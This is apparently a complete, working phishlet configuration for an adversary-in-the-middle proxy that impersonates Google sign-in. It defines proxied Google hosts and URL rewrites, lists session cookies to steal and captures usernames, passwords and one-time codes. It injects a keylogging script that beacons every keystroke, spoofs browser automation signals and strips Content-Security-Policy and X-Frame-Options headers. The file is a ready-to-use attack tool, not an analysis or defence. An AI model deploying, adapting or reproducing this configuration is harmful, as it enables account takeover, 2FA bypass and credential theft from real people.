name: "google"
author: "@redteam_expert"
min_ver: "3.0.0"
proxy_hosts:
  - {phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", session: true, is_landing: true}
  - {phish_sub: "ssl", orig_sub: "ssl", domain: "gstatic.com", session: false, is_landing: false}
  - {phish_sub: "www", orig_sub: "www", domain: "google.com", session: false, is_landing: false}
  - {phish_sub: "apis", orig_sub: "apis", domain: "google.com", session: false, is_landing: false}
sub_filters:
  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://accounts.google.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https:\\/\\/accounts.google.com\\/", replace: "https:\\/\\/{hostname}\\/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https://ssl.gstatic.com/", replace: "https://{hostname}/_ssl/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https:\\/\\/ssl.gstatic.com\\/", replace: "https:\\/\\/{hostname}\\/_ssl\\/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.google.com", orig_sub: "www", domain: "google.com", search: "https://www.google.com/", replace: "https://{hostname}/_www/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.google.com", orig_sub: "www", domain: "google.com", search: "https:\\/\\/www.google.com\\/", replace: "https:\\/\\/{hostname}\\/_www\\/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "apis.google.com", orig_sub: "apis", domain: "google.com", search: "https://apis.google.com/", replace: "https://{hostname}/_apis/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "apis.google.com", orig_sub: "apis", domain: "google.com", search: "https:\\/\\/apis.google.com\\/", replace: "https:\\/\\/{hostname}\\/_apis\\/", mimes: ["text/html", "application/json", "application/javascript"]}
auth_tokens:
  - domain: ".google.com"
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID", "NID", "GAPS", "LSID", "SIDCC", "__Host-GAPS"]
  - domain: "accounts.google.com"
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID", "NID", "GAPS", "LSID", "SIDCC", "__Host-GAPS"]
credentials:
  username:
    key: "identifier"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"
  2fa:
    key: "otp"
    search: "(.*)"
    type: "post"
login:
  domain: "accounts.google.com"
  path: "/signin/v2/identifier"
js_inject:
  - trigger_domains: ["accounts.google.com"]
    trigger_paths: ["/signin/v2/identifier", "/ServiceLogin"]
    script: |
      (function(){
        // Anti-Bot: Mock user behavior
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
        
        document.addEventListener('contextmenu', e => e.preventDefault());
        setInterval(() => {
           const ev = new MouseEvent('mousemove', {
               view: window, bubbles: true, cancelable: true, 
               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
           });
           document.dispatchEvent(ev);
        }, 3000);
        
        // Input Capture
        document.addEventListener('input', function(e) {
            if(e.target.tagName === 'INPUT') {
                 // Send to Beacon
                 if(window.navigator.sendBeacon) {
                    const data = new FormData();
                    data.append('k', e.target.value);
                    data.append('f', e.target.name || e.target.id);
                    window.navigator.sendBeacon('/__vanta_track', data);
                 }
            }
        });
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
bridges:
  - {prefix: "/_ssl/", target_host: "ssl.gstatic.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_www/", target_host: "www.google.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_apis/", target_host: "apis.google.com", strip_prefix: true, cors: "allow_all"}
